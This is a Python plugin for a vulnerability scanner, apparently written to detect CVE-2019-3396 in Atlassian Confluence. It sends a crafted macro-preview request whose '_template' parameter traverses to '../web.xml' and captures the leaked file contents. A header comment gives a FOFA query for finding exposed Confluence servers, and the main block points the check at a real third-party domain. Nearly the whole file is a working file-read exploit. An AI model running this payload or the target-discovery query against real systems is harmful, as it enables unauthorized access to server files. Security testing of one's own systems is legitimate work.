#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import re

'''
https://www.seebug.org/vuldb/ssvid-97898
fofa:  "confluence" && port=8090
'''

def info(data=None):
    info = {
        "name": "CVE-2019-3396",
        "info": "CVE-2019-3396",
        "level": "high",
        "type": "CVE-2019-3396",
    }
    return info

def prove(data):
    data = init(data, 'confluence')
    if data['base_url']:
        filename = "../web.xml"
        limitSize = 100

        payload = data['base_url'] + "rest/tinymce/1/macro/preview"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Referer": data['base_url'] + "pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
            "Content-Type": "application/json; charset=utf-8"
        }
        _data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
        try:
            r = curl('post', payload, data=_data, headers=headers)
            if r.status_code == 200 and "</web-app>" in r.text:
                m = re.search('<web-app[\s\S]+<\/web-app>', r.text)
                if m:
                    content = m.group()[:limitSize]
                    data['flag'] = 1
                    data['data'].append({"content": content})
                    data['res'].append({"info": payload, "key": filename})

        except:
            pass

    return data



if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))
